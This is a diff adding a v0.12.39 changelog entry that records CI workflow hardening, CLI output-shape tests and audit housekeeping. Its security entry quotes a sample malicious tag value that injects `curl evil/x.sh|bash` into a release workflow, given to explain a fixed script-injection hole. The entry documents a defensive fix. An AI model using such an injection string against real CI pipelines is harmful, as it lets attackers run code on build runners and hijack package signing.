@@ -1,5 +1,44 @@
 # Changelog
 
+## 0.12.39 — 2026-05-16
+
+Cycle 19 CI workflow hardening + CLI envelope shape contracts. One P1 script-injection sink in `release.yml` closed; three P3 housekeeping fixes; envelope shape pinned on the 6 verbs the cycle 13 audit deferred.
+
+### Security
+
+**`release.yml` `inputs.tag` script-injection sink hardened.** Pre-fix the workflow_dispatch input `inputs.tag` was interpolated directly into a `run:` block (CWE-94 / CWE-78 class). A maintainer (or compromised actions:write token) firing `workflow_dispatch` with `tag = '"; curl evil/x.sh|bash; #"'` would have executed on the runner. The `npm-publish` environment has `id-token: write` available downstream, so an exploited dispatch could compromise npm provenance signing identity in the same workflow run. Fix: env-var indirection + regex allowlist `^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$`. Mirrors the existing `refresh.yml` `inputs.source` hardening pattern. Cycle 19 A P1 F1.
+
+### Bugs
+
+**`scorecard.yml` `permissions: read-all` → explicit scopes.** Pre-fix the workflow-level fallback was `read-all`. Scorecard's own ruleset may flag that on a future bump; explicit `contents: read` + `actions: read` documents what we actually consume. Cycle 19 A P3 F6.
+
+**`GITLEAKS_FALLBACK` bumped to 8.28.0** (was 8.21.2). Documented as "bump each time the workflow is touched"; cycle 19 audit caught the drift. Cycle 19 A P3 F7.
+
+**Docker ecosystem added to Dependabot.** `docker/test.Dockerfile` (used by `npm run test:docker` + `test:docker:fresh`) was outside Dependabot scope so the base image could float without surfacing. Test-only image (no production exposure), but a docker-ecosystem block + weekly cadence brings it under Scorecard's PinnedDependenciesID coverage. Cycle 19 A P3 F8.
+
+### Features
+
+**CLI envelope shape contracts pinned on 6 more verbs.** v0.12.33 pinned `attest list`, `attest verify`, `version`. Cycle 13 P3 F3 surfaced that the rest were still unpinned — a contributor adding a new top-level field to `run` / `ci` / `discover` / `brief --all` / `doctor` / `watchlist` would not get a forcing-function test failure. v0.12.39 closes the gap with 8 new pins in `tests/cli-output-envelope-shape-v0_12_39.test.js`:
+
+- `brief --all` — 8 top-level keys (no `verb` field; intentional transitional inconsistency)
+- `ci --required <pb>` — 5 top-level keys + 13-key `summary` sub-shape; pins absence of top-level `ok`
+- `discover --json` — 4 top-level keys + 5-key `context` sub-shape
+- `doctor --json` — 3 top-level keys + 5-key `summary` sub-shape + baseline 5-check set
+- `watchlist --json` (default by-item mode) + `--by-skill` variant — mutually exclusive `by_item` / `by_skill` field
+- `run <pb> --evidence --json` (single-playbook success) — 10 top-level keys, pins absence of conditional `prior_session_id` / `overwrote_at` (only present on `--force-overwrite`)
+
+Several intentional inconsistencies pinned by absence:
+- `brief --all` and `watchlist` do NOT emit `verb` (every other verb does). Flagged for v0.13 envelope harmonization.
+- `ci` and `doctor` do NOT emit top-level `ok` (they signal pass/fail via `summary.verdict` / `summary.all_green`). Pinned so the v0.11.13 emit() contract doesn't accidentally grow.
+
+### Internal
+
+- Cycle 19 audit dispatched 3 agents (workflow security, envelope specs, 24h intake / Pwn2Own Day 3). All 3 returned.
+- Cycle 19 A P2 findings (id-token + contents-write co-residency on `publish` job, `always-auth NPM_TOKEN` ↔ OIDC, `refresh.yml` persisted credentials) deferred to v0.13 — they're structural job-split refactors, not single-line fixes.
+- Cycle 19 C: no new CVE additions in the 24h window. Pwn2Own Day 3 results still embargoed (Claude Code + Ollama Day 3 attempts pending). CVE-2026-42897 still mitigation-only.
+- Test count 1149 → 1157. 14/14 predeploy gates green.
+
+
 ## 0.12.38 — 2026-05-16
 
 Cycle 18 security fix + state refresh. The P1 closes a multi-tenant attestation-file-mode gap; cycle 18 A inventoried the full v0.13.0 readiness list (60 items, 11-15 days) for the next minor bump.
